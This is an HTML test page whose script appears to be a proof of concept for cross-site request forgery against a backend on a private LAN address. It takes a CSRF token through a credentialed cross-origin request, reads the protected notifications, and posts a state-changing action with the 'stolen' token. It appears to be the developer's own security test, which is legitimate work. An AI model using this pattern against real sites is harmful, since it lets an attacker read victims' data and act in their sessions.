<!doctype html>
<html>
<body>
  <button id="go">Run Test</button>
  <pre id="out"></pre>

  <script>
    const API = 'http://192.168.60.199/OJT2/backend/public/index.php';
    const out = document.getElementById('out');

    function log(label, data) {
      out.textContent += `\n[${label}]\n` + JSON.stringify(data, null, 2) + '\n';
    }

    async function run() {
      try {
        // 1) Get CSRF token from your backend
        const verifyRes = await fetch(`${API}/auth/verify`, { credentials: 'include' });
        const verifyData = await verifyRes.json();
        log('verify', { status: verifyRes.status, data: verifyData });

        const csrf = verifyData.csrf_token;

        // 2) Read protected data
        const beforeRes = await fetch(`${API}/api/notifications`, { credentials: 'include' });
        const beforeData = await beforeRes.json();
        log('notifications BEFORE', { status: beforeRes.status, data: beforeData });

        // 3) Perform state-changing action using stolen CSRF token
        const markRes = await fetch(`${API}/api/notifications/read`, {
          method: 'POST',
          credentials: 'include',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrf
          },
          body: JSON.stringify({})
        });
        const markData = await markRes.json().catch(async () => await markRes.text());
        log('markAsRead', { status: markRes.status, data: markData });

        // 4) Read again to confirm change
        const afterRes = await fetch(`${API}/api/notifications`, { credentials: 'include' });
        const afterData = await afterRes.json();
        log('notifications AFTER', { status: afterRes.status, data: afterData });

      } catch (e) {
        log('error', String(e));
      }
    }

    document.getElementById('go').addEventListener('click', run);
  </script>
</body>
</html>
